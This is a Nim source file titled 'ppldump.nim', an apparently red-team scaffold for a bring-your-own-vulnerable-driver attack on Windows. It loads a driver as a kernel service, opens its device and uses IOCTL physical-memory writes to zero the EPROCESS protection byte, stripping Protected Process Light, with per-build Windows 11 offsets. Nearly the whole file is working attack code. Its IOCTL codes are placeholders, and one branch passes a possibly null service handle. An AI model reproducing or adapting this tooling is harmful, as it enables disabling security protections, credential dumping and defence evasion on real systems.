# ppldump.nim — Kernel write primitive (driver-agnostic BYOVD scaffold)
#
# Driver-agnostic kernel write primitive scaffold.
# IOCTL codes and driver name are placeholders — update per-engagement.
# EPROCESS.Protection offsets:
#   Win11 22H2/23H2 (22621/22631): 0x87A
#   Win11 24H2      (26100):       0x882

import winim

const
  DRIVER_SERVICE_NAME* = "WinRing0_1_2_0"  # update per engagement
  IOCTL_MEM_READ*:  uint32 = 0xDEAD_BEEF'u32
  IOCTL_MEM_WRITE*: uint32 = 0xDEAD_C0DE'u32

const
  PPL_NONE*:  byte = 0x00
  PPL_WINTCB*: byte = 0x72
  EPROCESS_PROTECTION_OFFSET_24H2*: uint64 = 0x882'u64

type
  DeviceIoControlFn* = proc(h: pointer, code: uint32, inBuf: pointer, inSz: uint32,
                              outBuf: pointer, outSz: uint32, returned: ptr uint32,
                              ovl: pointer): int32 {.stdcall.}
  CloseHandleFn*     = proc(h: pointer): int32 {.stdcall.}
  CreateFileWFn*     = proc(path: ptr uint16, access, share: uint32, sa: pointer,
                              disp, flags: uint32, templ: pointer): pointer {.stdcall.}
  OpenSCManagerWFn*  = proc(machine, db: ptr uint16, access: uint32): pointer {.stdcall.}
  OpenServiceWFn*    = proc(scm: pointer, name: ptr uint16, access: uint32): pointer {.stdcall.}
  CreateServiceWFn*  = proc(scm, name, display: pointer, access, svcType, startType,
                              errCtrl: uint32, binPath, loadOrderGroup: pointer,
                              tagId, dependencies, svcStartName, password: pointer): pointer {.stdcall.}
  StartServiceWFn*   = proc(svc: pointer, argc: uint32, argv: ptr pointer): int32 {.stdcall.}
  DeleteServiceFn*   = proc(svc: pointer): int32 {.stdcall.}
  CloseServiceHandleFn* = proc(svc: pointer): int32 {.stdcall.}

type
  KernelWriteCtx* = object
    hDevice*: pointer
    fnIoctl*: DeviceIoControlFn
    fnClose*: CloseHandleFn

proc writePhysical*(ctx: KernelWriteCtx, physAddr: uint64, val: byte): bool =
  # unsafe
  type WriteReq {.pure.} = object
    address: uint64
    value:   byte
    pad:     array[7, byte]
  var req = WriteReq(address: physAddr, value: val)
  var returned: uint32 = 0
  ctx.fnIoctl(ctx.hDevice, IOCTL_MEM_WRITE,
              addr req, uint32(sizeof(req)),
              nil, 0, addr returned, nil) != 0

proc readPhysical*(ctx: KernelWriteCtx, physAddr: uint64): (bool, byte) =
  # unsafe
  type ReadReq {.pure.} = object
    address: uint64
    pad:     array[8, byte]
  var req = ReadReq(address: physAddr)
  var outVal: byte = 0
  var returned: uint32 = 0
  let ok = ctx.fnIoctl(ctx.hDevice, IOCTL_MEM_READ,
                        addr req, uint32(sizeof(req)),
                        addr outVal, 1, addr returned, nil)
  (ok != 0, outVal)

proc clearPpl*(ctx: KernelWriteCtx, eprocessPhys: uint64, buildNumber: uint32): bool =
  # unsafe
  let offset = case buildNumber
    of 26100'u32:        EPROCESS_PROTECTION_OFFSET_24H2
    of 22621'u32, 22631'u32: 0x87A'u64
    else:                0x87A'u64
  ctx.writePhysical(eprocessPhys + offset, PPL_NONE)

proc closeCtx*(ctx: KernelWriteCtx) =
  # unsafe
  discard ctx.fnClose(ctx.hDevice)

proc loadDriverAndOpen*(
  sysPath:   string,
  devPath:   string,
  fnScm:     OpenSCManagerWFn,
  fnCreate:  CreateServiceWFn,
  fnOpenSvc: OpenServiceWFn,
  fnStart:   StartServiceWFn,
  fnOpenDev: CreateFileWFn,
  fnIoctl:   DeviceIoControlFn,
  fnClose:   CloseHandleFn,
): (bool, KernelWriteCtx) =
  # unsafe
  var wideSvc = newSeq[uint16](DRIVER_SERVICE_NAME.len + 1)
  for i, c in DRIVER_SERVICE_NAME: wideSvc[i] = uint16(c)
  wideSvc[DRIVER_SERVICE_NAME.len] = 0

  var wideSys = newSeq[uint16](sysPath.len + 1)
  for i, c in sysPath: wideSys[i] = uint16(c)
  wideSys[sysPath.len] = 0

  var wideDev = newSeq[uint16](devPath.len + 1)
  for i, c in devPath: wideDev[i] = uint16(c)
  wideDev[devPath.len] = 0

  let hScm = fnScm(nil, nil, 0xF003F'u32)
  if hScm == nil: return (false, KernelWriteCtx())

  let hSvc = fnCreate(hScm, addr wideSvc[0], addr wideSvc[0],
                       0xF01FF'u32, 0x1'u32, 0x3'u32, 0x1'u32,
                       addr wideSys[0], nil, nil, nil, nil, nil)
  if hSvc == nil:
    let hExisting = fnOpenSvc(hScm, addr wideSvc[0], 0xF01FF'u32)
    if hExisting == nil: return (false, KernelWriteCtx())

  discard fnStart(hSvc, 0, nil)

  let hDevice = fnOpenDev(addr wideDev[0], 0xC000_0000'u32, 0, nil, 3, 0, nil)
  if cast[uint](hDevice) == uint(high(int)):
    return (false, KernelWriteCtx())

  (true, KernelWriteCtx(hDevice: hDevice, fnIoctl: fnIoctl, fnClose: fnClose))
